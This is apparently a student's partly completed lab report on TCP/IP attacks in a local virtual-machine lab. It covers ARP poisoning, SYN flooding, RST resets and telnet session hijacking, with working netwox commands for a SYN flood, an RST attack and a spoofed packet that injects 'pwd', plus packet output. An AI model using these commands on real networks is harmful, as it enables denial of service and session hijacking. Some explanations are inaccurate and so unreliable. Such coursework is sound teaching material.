@@ -1,0 +1,219 @@
+Task1(20 marks):
+
+1. Describe the mechanism of ARP cache poisoning (10 marks)
+
+The purpose of ARP cache poisoning is to send fake ARP messages onto the LAN. The most common reason for this is to associate the 
+attacker's MAC address with the IP address of another host. Therefore, any traffic that is meant for the victim now is then sent
+to the attacker instead. Alternatively, the attack can associate the victim's IP address with a non-existent MAC address. This 
+effectively is a Denial-of-Service attack against the victim.
+
+The ARP cache poisoning attack can only be performed on a computer connected to a LAN. The attacker can use a tool such as Netwox
+to send fake data frames, which effectively overwrites any previous entry of the target. By spoofing the source and destination
+fields of the ARP data frame, the attacker can gain control the fate of the traffic intended for the victim.
+
+
+2. Describe how to use netwox tool to poison ARP cache (5 marks)
+
+
+
+
+
+
+3. Screenshot of arp table to show the change before and after your attack (5 marks)
+
+
+
+ 
+Task2(20 marks):
+1. Describe the mechanism of SYN Flooding Attack (5 marks)
+
+
+The SYN flooding attacks exploit the TCP's three-way handshake mechanism, and also its limitation 
+to maintain alf-open connections. 
+
+When a server receives a SYN request, it returns a SYN/ACK packet to the client. 
+
+While the SYN/ACK packet has not been acknowledged by the client, the connection remains in a half-opened state
+(up till the connection timeouts)
+
+Because the server has finite system memory to maintain any half-opened connections, when this limit is reached,
+all other connection requests will be dropped. 
+
+SYN flooding repeatedly sends TCP connection requests, up till the point where the system cannot no longer
+keep track of the number of half-opened connections.
+
+This effectively means that a denial of service attack has taken place.
+
+
+2. Describe how to use netwox tool to attack (5 marks)
+
+sudo netwox 76 -i 172.16.234.142 -p 23 -s linkbraw
+
+3. Screenshot to show half-opened connection (5 marks)
+
+rambo@ubuntu:~$ sudo netstat -na | grep "23"
+tcp        0      0 172.16.234.142:23       246.226.93.74:57628     SYN_RECV   
+tcp        0      0 172.16.234.142:23       252.145.170.8:9018      SYN_RECV   
+tcp        0      0 172.16.234.142:23       248.168.107.73:8791     SYN_RECV   
+tcp        0      0 172.16.234.142:23       243.74.113.238:2776     SYN_RECV   
+tcp        0      0 172.16.234.142:23       253.41.156.128:61488    SYN_RECV   
+tcp        0      0 172.16.234.142:23       243.111.53.174:33252    SYN_RECV   
+tcp        0      0 172.16.234.142:23       242.240.27.191:10782    SYN_RECV   
+tcp        0      0 172.16.234.142:23       255.204.2.66:14414      SYN_RECV   
+tcp        0      0 172.16.234.142:23       253.173.248.215:40191   SYN_RECV   
+tcp        0      0 172.16.234.142:23       250.157.216.179:48343   SYN_RECV   
+tcp        0      0 172.16.234.142:23       252.37.47.195:27620     SYN_RECV   
+tcp        0      0 172.16.234.142:23       246.209.19.125:5805     SYN_RECV   
+tcp        0      0 172.16.234.142:23       242.175.172.74:5487     SYN_RECV   
+tcp        0      0 172.16.234.142:23       251.127.156.219:23095   SYN_RECV   
+tcp        0      0 172.16.234.142:23       247.30.158.24:36984     SYN_RECV   
+tcp        0      0 172.16.234.142:23       253.96.249.124:57485    SYN_RECV   
+tcp        0      0 172.16.234.142:23       245.210.142.237:61521   SYN_RECV   
+tcp        0      0 172.16.234.142:23       243.165.205.212:59461   SYN_RECV   
+
+							< truncated for brevity >
+
+tcp        0      0 172.16.234.142:23       245.163.255.31:21881    SYN_RECV   
+tcp        0      0 172.16.234.142:23       255.91.98.95:18379      SYN_RECV   
+tcp        0      0 172.16.234.142:23       244.223.88.91:58135     SYN_RECV   
+tcp        0      0 172.16.234.142:23       253.234.195.24:28861    SYN_RECV   
+tcp        0      0 172.16.234.142:23       247.249.150.169:57183   SYN_RECV   
+tcp        0      0 172.16.234.142:23       250.124.116.157:14418   SYN_RECV   
+tcp        0      0 172.16.234.142:23       241.66.107.181:45193    SYN_RECV   
+tcp        0      0 172.16.234.142:23       251.229.36.187:40479    SYN_RECV   
+tcp        0      0 172.16.234.142:23       243.243.36.14:57022     SYN_RECV   
+tcp        0      0 172.16.234.142:23       172.16.234.1:63413      ESTABLISHED
+tcp       38      0 172.16.234.142:33122    75.126.110.108:443      CLOSE_WAIT 
+tcp       38      0 172.16.234.142:45859    199.47.216.174:443      CLOSE_WAIT 
+tcp        0      0 172.16.234.142:41532    199.47.217.149:80       ESTABLISHED
+tcp6       0      0 :::23                   :::*                    LISTEN     
+
+After the command has been executed, any telnet connection fails to be established.
+
+4. Explain the changes caused by turning on or off net.ipv4.tcp_syncookies (5 marks)
+
+By turning on "net.ipv4.tcp_syncookies", a TCP connection to the telnet server is still possible despite
+the SYN flooding attack.
+
+The main idea in using SYN Cookies is not to store any of the connections locally. That is, no memory
+is spent remember the half opened connections. Instead, for each initial connection, we can encode
+all the information needed (source ip address, sequence number etc) into a SYN-ACK and send it back to
+the client. If the client responses, the server can decode the information.
+
+
+Task3(20 marks):
+
+1. Explain TCP RST attack (10 marks)
+
+The main idea behind the TCP reset attack is simply to wrongly terminate an already established TCP 
+connection.
+
+For example, the victim is playing a video on an online streaming website. The attacker, spoofs a 
+packet that matches the source port and IP address of the victim, and also the current sequence 
+number of the current TCP connection between the victim and the streaming website. The attacker
+then sets the RST bit on the spoofed packet. When the streaming website recieves this, it immediately
+terminates the connection. This is another form of denial-of-service attack.
+
+2. Describe how to use netwox tool to launch this attack (5 marks)
+
+sudo netwox 78
+
+3. Screenshot and description of your result (5 marks)
+
+It was observed that once tool 78 was launched, the video streaming (and any tcp connection thereafter)
+would be impossible.
+
+Using Wireshark, we can observe that TCP RST is replied for each TCP connection that was made,
+as illustrated by the screenshot.
+ 
+Task4(40 marks):
+1. Explain TCP session hijacking (10 marks)
+
+TCP session hijacking is the exploitation of the web session control mechanism.
+
+The web server uses a token that the web server sends to the client after each successful
+client authentication. This session token is used to identify each of the user's connections.
+The attack exploits this fact by either trying to steal or predict a valid session token. 
+A successful attempt would give the attacker access to the server.
+
+
+2. Describe how to inject a "pwd" command using netwox tool, explain the meaning of the command line arguments (5 marks)
+
+Firstly, we use Wireshark to monitor the Telnet TCP packets. We are interested in the very last
+Telnet TCP packets.
+
+Next, by using netwox tool 40, we can set up the command as such:
+
+The arguments which need to be changed are:
+
+ip4-src    : IP address of the user
+ip4-dst    : IP address of the server
+tcp-seqnum : The last sequence number of the TCP telnet packet
+tcp-ackum  : The last acknowledgement number of the TCP telnet packet
+tcp-window : The TCP window size of the TCP telnet packet
+tcp-data   : The data we want to inject into the TCP session (in this case the Telnet session)
+
+sudo netwox 40 --ip4-dontfrag --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 --ip4-src 172.16.234.1 
+--ip4-dst 172.16.234.142 --ip4-opt "" --tcp-src 64749 --tcp-dst 23 --tcp-seqnum 1465017613 
+--tcp-acknum 181469760 --tcp-ack --tcp-psh --tcp-window 65535 --tcp-opt "" 
+--tcp-data "'pwd'0d0a" --spoofip "best"
+
+
+3. Screenshots to show the results using wireshark (5 marks)
+
+rambo@ubuntu:~$ sudo netwox 40 --ip4-dontfrag --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 --ip4-src 172.16.234.1 --ip4-dst 172.16.234.142 --ip4-opt "" --tcp-src 64749 --tcp-dst 23 --tcp-seqnum 1465017613 --tcp-acknum 181469760 --tcp-ack --tcp-psh --tcp-window 65535 --tcp-opt "" --tcp-data "'pwd'0d0a" --spoofip "best"
+IP______________________________________________________________.
+|version|  ihl  |      tos      |            totlen             |
+|___4___|___5___|____0x00=0_____|___________0x002D=45___________|
+|              id               |r|D|M|       offsetfrag        |
+|_________0xBDBC=48572__________|0|1|0|________0x0000=0_________|
+|      ttl      |   protocol    |           checksum            |
+|____0x40=64____|____0x06=6_____|____________0x505D_____________|
+|                            source                             |
+|_________________________172.16.234.1__________________________|
+|                          destination                          |
+|________________________172.16.234.142_________________________|
+TCP_____________________________________________________________.
+|          source port          |       destination port        |
+|_________0xFCED=64749__________|___________0x0017=23___________|
+|                            seqnum                             |
+|_____________________0x5752650D=1465017613_____________________|
+|                            acknum                             |
+|_____________________0x0AD10240=181469760______________________|
+| doff  |r|r|r|r|C|E|U|A|P|R|S|F|            window             |
+|___5___|0|0|0|0|0|0|0|1|1|0|0|0|_________0xFFFF=65535__________|
+|           checksum            |            urgptr             |
+|_________0xDE1B=56859__________|___________0x0000=0____________|
+70 77 64 0d  0a                                     # pwd..
+
+
+4. Explain the reason of the abnormal behavior you observed through wireshark (5 marks)
+
+From Wireshark, we can observe that Netwox repeatedly sends an ACK with "PWD".
+When this happens, the victim's telnet session is unresponsive.
+When left untouched, the Telnet server eventually resets.
+
+
+5. Eliminate the abnormal packets using the netwox tool, explain your idea and your command (5 marks)
+
+
+
+
+
+
+
+
+6. Answer the three questions in investigation (10 marks)
+
+(1) The ISN are generated in sequence. I.e. They are incremented by 1.
+
+(2) The TCP window size does not change throughout the session, and remains unchanged even when the telnet
+session is restarted.
+
+(3) The source port numbers, while assigned at random, remain unchanged during throughout the session. However,
+once the session is terminated, a new source port number is assigned.
+
+
+
+sudo netwox 40 --ip4-dontfrag --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 --ip4-src 172.16.234.1 --ip4-dst 172.16.234.142 --ip4-opt "" --tcp-src 65064 --tcp-dst 23 --tcp-seqnum 2125919314 --tcp-acknum 422184978 --tcp-ack --tcp-psh --tcp-window 65535 --tcp-opt "" --tcp-data "'pwd'0d0a" --spoofip "best"
+
